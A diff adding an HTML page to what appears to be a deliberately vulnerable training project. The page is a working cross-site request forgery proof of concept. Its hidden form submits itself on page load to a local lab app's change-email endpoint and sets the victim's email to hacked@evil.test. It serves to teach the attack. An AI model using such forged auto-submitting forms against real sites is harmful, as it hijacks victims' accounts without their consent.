@@ -1,0 +1,23 @@
+<!-- INTENTIONALLY VULNERABLE. For learning only. Never use in a real app. -->
+<!--
+  BASIC CSRF: FORCED EMAIL MODIFICATION
+  The attacker hosts this page on http://127.0.0.1:7000.
+  When the victim visits, the form submits immediately to http://localhost:5001/api/change-email.
+  If the victim has an active session, the browser attaches the session cookie automatically.
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Executing CSRF Attack: Change Email</title>
+  </head>
+  <body>
+    <h2>Submitting change-email request to victim application...</h2>
+    <form id="csrf-form" action="http://localhost:5001/api/change-email" method="POST">
+      <input type="hidden" name="email" value="hacked@evil.test">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
